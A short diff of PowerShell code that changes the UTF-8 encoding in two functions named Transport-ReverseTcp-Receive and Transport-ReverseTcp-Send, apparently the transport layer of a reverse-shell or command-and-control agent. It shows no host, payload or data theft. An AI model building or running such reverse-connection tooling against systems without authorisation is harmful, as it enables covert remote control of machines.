@@ -46,16 +46,17 @@ function Transport-ReverseTcp-Receive([PSObject] $obj, [Int32] $bytestoread) {
 	$buffer = New-Object char[]($bytestoread)
 	while ($numb -lt $bytestoread) {
 		$numb += $obj.reader.Read($buffer, $numb, $bytestoread-$numb)
-	}		
-	return $buffer
+	}
+	return [System.Text.Encoding]::UTF8.GetBytes($buffer)
     #} else {
     #    Write-Output "ERROR when receiving"
     #}
 }
 
-function Transport-ReverseTcp-Send([PSObject] $obj, $data) {
+function Transport-ReverseTcp-Send([PSObject] $obj, [byte[]] $data) {
+    $senddata = [System.Text.Encoding]::UTF8.GetString($data).ToCharArray()
     if ($obj.tcpConnection.Connected) {
-        $obj.writer.Write($data)
+        $obj.writer.Write($senddata)
     } else {
         Write-Output "ERROR when sending"
     }
